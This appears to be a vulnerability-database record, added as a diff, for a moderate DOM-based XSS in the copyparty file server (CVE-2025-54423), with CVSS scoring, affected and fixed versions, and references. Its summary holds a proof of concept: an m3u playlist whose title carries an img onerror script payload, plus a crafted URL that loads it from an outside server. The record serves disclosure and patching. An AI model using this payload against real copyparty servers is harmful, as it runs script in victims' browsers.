@@ -1,0 +1,52 @@
+advisory_id: GHSA-9q4r-x2hj-jmvr
+datasource_id: github_osv_importer_v2/GHSA-9q4r-x2hj-jmvr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-9q4r-x2hj-jmvr/GHSA-9q4r-x2hj-jmvr.json
+aliases:
+  - CVE-2025-54423
+summary: "copyparty has DOM-Based XSS vulnerability when displaying multimedia metadata\n###\
+  \ Summary\n\nAn unauthenticated attacker is able to execute arbitrary JavaScript code in a\
+  \ victim's browser due to improper sanitization of multimedia tags in music files, including\
+  \ `m3u` files.\n\n### Details\n\nMultimedia metadata is rendered in the web-app without sanitization.\
+  \ This can be exploited in two ways:\n\n* a user which has the necessary permission for uploading\
+  \ files can upload a song with an artist-name such as `<img src=x onerror=alert(document.domain)>`\n\
+  * an unauthenticated user can trick another user into clicking a malicious URL, performing\
+  \ this same exploit using an externally-hosted m3u file\n\nThe CVE score and PoC is based\
+  \ on the m3u approach, which results in a higher severity.\n\n### PoC\n1.  Create a file named\
+  \ `song.m3u` with the following content. Host this file on an attacker-controlled web server.\n\
+  \n    ```m3u\n    #EXTM3U\n    #EXTINF:1,\"><img src=x onerror=alert(document.domain)> - \"\
+  ><img src=x onerror=alert(document.domain)>\n    http://example.com/audio.mp3\n    ```\n\n\
+  2.  Craft and share the malicious URL:  \n\n    ```\n    http://127.0.0.1:3923/#m3u=https://example.com/song.m3u\n\
+  \    ```\n\n\n### Impact\nAny user that accesses this malicious URL is impacted."
+impacted_packages:
+  - purl: pkg:pypi/copyparty
+    affected_versions: vers:pypi/<=1.18.4
+    fixed_versions: vers:pypi/1.18.5
+severities:
+  - score: '5.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-9q4r-x2hj-jmvr/GHSA-9q4r-x2hj-jmvr.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/9001/copyparty
+    reference_type:
+    reference_id:
+  - url: https://github.com/9001/copyparty/commit/895880aeb0be0813ddf732487596633f8f9fc3a6
+    reference_type:
+    reference_id:
+  - url: https://github.com/9001/copyparty/releases/tag/v1.18.5
+    reference_type:
+    reference_id:
+  - url: https://github.com/9001/copyparty/security/advisories/GHSA-9q4r-x2hj-jmvr
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-54423
+    reference_type:
+    reference_id:
